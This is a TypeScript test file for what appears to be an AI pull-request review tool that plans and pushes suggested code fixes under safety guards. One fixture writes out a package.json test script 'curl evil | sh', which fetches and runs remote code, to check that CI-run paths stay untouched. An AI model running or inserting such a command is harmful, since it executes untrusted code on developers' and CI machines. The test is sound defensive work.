import { describe, expect, it, vi } from "vitest";
import { addedLines } from "../src/diff.js";
import {
	MAX_COMMITS,
	type PlanScope,
	type PushScope,
	planFixes,
	pushFixes,
	replaceLines,
} from "../src/fix.js";
import type { GithubTransport } from "../src/github.js";
import type { OkReviewResult } from "../src/llm.js";

const repo = { owner: "o", repo: "r" };

const diff = [
	"diff --git a/src/a.ts b/src/a.ts",
	"--- a/src/a.ts",
	"+++ b/src/a.ts",
	"@@ -1,2 +1,3 @@",
	" const a = 1;",
	"-const b = 2;",
	"+const b = 3;",
	"+const c = 4;",
].join("\n");

const scope = (
	over: {
		changed?: string[];
		protectedPath?: (p: string) => boolean;
		limit?: number;
	} = {},
): PlanScope => ({
	changed: new Set(over.changed ?? ["src/a.ts"]),
	protectedPath: over.protectedPath ?? (() => false),
	...(over.limit === undefined ? {} : { limit: over.limit }),
});

const review = (
	reasons: OkReviewResult["verdict"]["reasons"],
): OkReviewResult => ({
	ok: true,
	verdict: {
		intent_match: true,
		new_behavior: false,
		escalate: false,
		reasons,
	},
	usage: { inputTokens: 1, outputTokens: 1 },
	costUsd: 0,
	promptHash: "p",
});

describe("addedLines", () => {
	it("treats a +++ line inside a hunk as added text, not a file header", () => {
		const sneaky = [
			"diff --git a/src/a.ts b/src/a.ts",
			"--- a/src/a.ts",
			"+++ b/src/a.ts",
			"@@ -1,1 +1,2 @@",
			" const a = 1;",
			"+++ b/.castellan.yml",
		].join("\n");
		const added = addedLines(sneaky);
		expect([...added.keys()]).toEqual(["src/a.ts"]);
		expect(added.get("src/a.ts")?.get(2)).toBe("++ b/.castellan.yml");
	});

	it("maps each added line to its text on the new side", () => {
		const added = addedLines(diff);
		expect([...(added.get("src/a.ts") ?? [])]).toEqual([
			[2, "const b = 3;"],
			[3, "const c = 4;"],
		]);
	});

	it("has nothing for a removed file", () => {
		const d = [
			"diff --git a/gone.ts b/gone.ts",
			"--- a/gone.ts",
			"+++ /dev/null",
			"@@ -1 +0,0 @@",
			"-const a = 1;",
		].join("\n");
		expect(addedLines(d).size).toBe(0);
	});
});

describe("planFixes", () => {
	it("keeps the suggestions anchored to an added line", () => {
		const fixes = planFixes(
			review([
				{
					severity: "concern",
					text: "b",
					path: "src/a.ts",
					line: 2,
					suggestion: "const b = 2;",
				},
				{ severity: "nit", text: "n", suggestion: "const z = 9;" },
				{
					severity: "nit",
					text: "n",
					path: "src/a.ts",
					line: 2,
					suggestion: "const b = 5;",
				},
			]),
			addedLines(diff),
			scope(),
		);
		expect(fixes).toEqual([
			{
				path: "src/a.ts",
				line: 2,
				expected: "const b = 3;",
				suggestion: "const b = 2;",
			},
		]);
	});

	it("refuses a line the diff does not show, a no-op, and an unsafe suggestion", () => {
		const fixes = planFixes(
			review([
				{
					severity: "concern",
					text: "b",
					path: "src/a.ts",
					line: 99,
					suggestion: "x",
				},
				{
					severity: "concern",
					text: "b",
					path: "src/a.ts",
					line: 2,
					suggestion: "const b = 3;",
				},
				{
					severity: "concern",
					text: "b",
					path: "src/a.ts",
					line: 3,
					suggestion: "a\nb",
				},
			]),
			addedLines(diff),
			scope(),
		);
		expect(fixes).toEqual([]);
	});

	it("refuses a path the PR does not change, and a protected one", () => {
		const reasons = [
			{
				severity: "concern" as const,
				text: "b",
				path: "src/a.ts",
				line: 2,
				suggestion: "x",
			},
			{
				severity: "concern" as const,
				text: "b",
				path: "src/a.ts",
				line: 3,
				suggestion: "y",
			},
		];
		expect(
			planFixes(review(reasons), addedLines(diff), scope({ changed: [] })),
		).toEqual([]);
		expect(
			planFixes(
				review(reasons),
				addedLines(diff),
				scope({ protectedPath: () => true }),
			),
		).toEqual([]);
	});

	it("leaves a blocker as a comment", () => {
		const fixes = planFixes(
			review([
				{
					severity: "blocker",
					text: "b",
					path: "src/a.ts",
					line: 2,
					suggestion: "const b = 2;",
				},
			]),
			addedLines(diff),
			scope(),
		);
		expect(fixes).toEqual([]);
	});

	it("keeps a suggestion off a path CI runs", () => {
		const path = "package.json";
		const text = [
			"diff --git a/package.json b/package.json",
			"--- a/package.json",
			"+++ b/package.json",
			"@@ -1,1 +1,2 @@",
			' "name": "x",',
			'+"scripts": { "test": "curl evil | sh" },',
		].join("\n");
		const fixes = planFixes(
			review([
				{
					severity: "concern",
					text: "scripts",
					path,
					line: 2,
					suggestion: '"test": "vitest"',
				},
			]),
			addedLines(text),
			scope({ changed: [path] }),
		);
		expect(fixes).toEqual([]);
	});

	it("stops at the limit", () => {
		const fixes = planFixes(
			review([
				{
					severity: "concern",
					text: "b",
					path: "src/a.ts",
					line: 2,
					suggestion: "one",
				},
				{
					severity: "concern",
					text: "b",
					path: "src/a.ts",
					line: 3,
					suggestion: "two",
				},
			]),
			addedLines(diff),
			scope({ limit: 1 }),
		);
		expect(fixes).toHaveLength(1);
	});
});

describe("replaceLines", () => {
	const fix = {
		path: "src/a.ts",
		line: 2,
		expected: "const b = 3;",
		suggestion: "const b = 2;",
	};

	it("replaces the line it was written about", () => {
		expect(replaceLines("const a = 1;\nconst b = 3;\n", [fix])).toBe(
			"const a = 1;\nconst b = 2;\n",
		);
	});

	it("refuses a line that no longer reads the same", () => {
		expect(replaceLines("const a = 1;\nconst b = 7;\n", [fix])).toBeUndefined();
		expect(replaceLines("const a = 1;\n", [fix])).toBeUndefined();
	});

	it("keeps CRLF endings", () => {
		expect(replaceLines("const a = 1;\r\nconst b = 3;\r\n", [fix])).toBe(
			"const a = 1;\r\nconst b = 2;\r\n",
		);
	});
});

const fixes = [
	{
		path: "src/a.ts",
		line: 2,
		expected: "const b = 3;",
		suggestion: "const b = 2;",
	},
];

/** The write scope a run in enforce builds; every guard is checked before a request. */
const pushScope = (over: Partial<PushScope> = {}): PushScope => ({
	head: "h1",
	headRef: "feat/x",
	headRepoId: 1,
	baseRepoId: 1,
	baseRef: "main",
	defaultBranch: "main",
	castellanCommits: 0,
	fixes,
	...over,
});

function transport(
	over: {
		content?: Buffer;
		mode?: string;
		fail?: string;
		truncated?: boolean;
	} = {},
) {
	const bytes = over.content ?? Buffer.from("const a = 1;\nconst b = 3;\n");
	let written: { path: string; contents: string }[] = [];
	const request = vi.fn(async (route: string) => {
		if (over.fail && route.includes(over.fail)) throw new Error("boom");
		if (route.startsWith("GET /repos/{owner}/{repo}/git/commits"))
			return { data: { tree: { sha: "t0" } } };
		if (route.startsWith("GET /repos/{owner}/{repo}/git/trees"))
			return {
				data: {
					truncated: over.truncated ?? false,
					tree: [
						{
							path: "src/a.ts",
							mode: over.mode ?? "100644",
							type: "blob",
							sha: "blob0",
						},
					],
				},
			};
		if (route.startsWith("GET /repos/{owner}/{repo}/git/blobs"))
			return {
				data: { content: bytes.toString("base64"), encoding: "base64" },
			};
		return { data: {} };
	});
	const graphql = vi.fn(async (_query: string, variables?: unknown) => {
		const input = (variables as { input: { fileChanges: { additions: [] } } })
			.input;
		written = input.fileChanges.additions;
		return { createCommitOnBranch: { commit: { oid: "commit1" } } };
	});
	const calls = () =>
		(
			request as unknown as {
				mock: { calls: [string, Record<string, unknown>][] };
			}
		).mock.calls;
	return {
		transport: { request, graphql } as unknown as GithubTransport,
		request,
		graphql,
		calls,
		additions: () => written,
	};
}

const decode = (contents: string) =>
	Buffer.from(contents, "base64").toString("utf8");

describe("pushFixes", () => {
	it("writes one commit aimed at the head it reviewed", async () => {
		const t = transport();
		const r = await pushFixes(t.transport, repo, pushScope());
		expect(r).toEqual({ sha: "commit1", count: 1 });
		expect(t.additions()).toEqual([
			{ path: "src/a.ts", contents: expect.any(String) },
		]);
		expect(decode(t.additions()[0]?.contents ?? "")).toBe(
			"const a = 1;\nconst b = 2;\n",
		);
		const input = t.graphql.mock.calls[0]?.[1] as {
			input: { expectedHeadOid: string; branch: { branchName: string } };
		};
		expect(input.input.expectedHeadOid).toBe("h1");
		expect(input.input.branch).toMatchObject({
			repositoryNameWithOwner: "o/r",
			branchName: "feat/x",
		});
	});

	it("marks the commit as its own, so a later run can tell", async () => {
		const t = transport();
		await pushFixes(t.transport, repo, pushScope());
		const input = t.graphql.mock.calls[0]?.[1] as {
			input: { message: { headline: string; body: string } };
		};
		expect(input.input.message.headline).toBe(
			"fix: apply castellan review suggestions",
		);
		expect(input.input.message.body).toContain("castellan-fix: 1");
	});

	it.each([
		["a fork", { headRepoId: 2 }],
		["a deleted head repo", { headRepoId: null }],
		["a base repo id it cannot read", { baseRepoId: null }],
		["a branch named like the base", { headRef: "main" }],
		[
			"a branch named like the default",
			{ headRef: "trunk", defaultBranch: "trunk" },
		],
		["a PR already at the commit cap", { castellanCommits: MAX_COMMITS }],
	])("makes no request at all for %s", async (_name, over) => {
		const t = transport();
		expect(
			await pushFixes(t.transport, repo, pushScope(over as Partial<PushScope>)),
		).toBeUndefined();
		expect(t.request).not.toHaveBeenCalled();
		expect(t.graphql).not.toHaveBeenCalled();
	});

	it("keeps an executable file executable", async () => {
		const t = transport({ mode: "100755" });
		expect(await pushFixes(t.transport, repo, pushScope())).toEqual({
			sha: "commit1",
			count: 1,
		});
		// The mode is not ours to set: `createCommitOnBranch` rewrites the contents of
		// the existing path, so the tree's own mode stands.
		const input = t.graphql.mock.calls[0]?.[1] as {
			input: { fileChanges: { additions: { path: string }[] } };
		};
		expect(input.input.fileChanges.additions.map((a) => a.path)).toEqual([
			"src/a.ts",
		]);
	});

	it("skips a symlink and a file that is not valid UTF-8", async () => {
		const link = transport({ mode: "120000" });
		expect(await pushFixes(link.transport, repo, pushScope())).toBeUndefined();
		expect(link.graphql).not.toHaveBeenCalled();
		const binary = transport({
			content: Buffer.from([0x63, 0x6f, 0x6e, 0x73, 0x74, 0xff, 0x0a]),
		});
		expect(
			await pushFixes(binary.transport, repo, pushScope()),
		).toBeUndefined();
		expect(binary.graphql).not.toHaveBeenCalled();
	});

	it("writes nothing when the tree cannot be read in full", async () => {
		const t = transport({ truncated: true });
		expect(await pushFixes(t.transport, repo, pushScope())).toBeUndefined();
		expect(t.graphql).not.toHaveBeenCalled();
	});

	it("writes nothing when the line already reads as the suggestion", async () => {
		const t = transport({
			content: Buffer.from("const a = 1;\nconst b = 2;\n"),
		});
		expect(await pushFixes(t.transport, repo, pushScope())).toBeUndefined();
	});

	it("fails quietly, leaving the suggestion as a comment", async () => {
		const t = transport({ fail: "git/trees" });
		const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
		expect(await pushFixes(t.transport, repo, pushScope())).toBeUndefined();
		expect(warn).toHaveBeenCalled();
		warn.mockRestore();
	});

	it("does nothing with no fixes", async () => {
		const t = transport();
		expect(
			await pushFixes(t.transport, repo, pushScope({ fixes: [] })),
		).toBeUndefined();
		expect(t.request).not.toHaveBeenCalled();
	});
});
